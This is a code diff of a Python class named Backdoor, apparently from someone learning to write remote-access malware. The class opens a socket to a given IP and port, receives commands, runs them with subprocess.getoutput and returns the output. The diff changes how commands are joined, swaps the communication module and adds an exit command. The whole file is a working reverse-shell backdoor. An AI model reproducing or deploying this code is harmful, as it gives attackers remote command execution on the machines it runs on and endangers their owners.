@@ -2,7 +2,7 @@
 import socket
 import subprocess
 import json
-import communicate as comms
+import json_communicate as comms
 
 
 class Backdoor:
@@ -11,13 +11,17 @@ class Backdoor:
         self.connection.connect((ip, port))
 
     def execute_system_command(self, command):
-        cmdstr = json.dumps(command)
+        cmdstr = " ".join(command)
         print("[+] received command " + cmdstr)
         return subprocess.getoutput(cmdstr)
 
     def run(self):
         while True:
             command = comms.receive(self.connection)
+            if command[0] == "exit":
+                self.connection.close()
+                exit()
+
             command_result = self.execute_system_command(command)
             print(command_result)
             comms.send(self.connection, command_result)
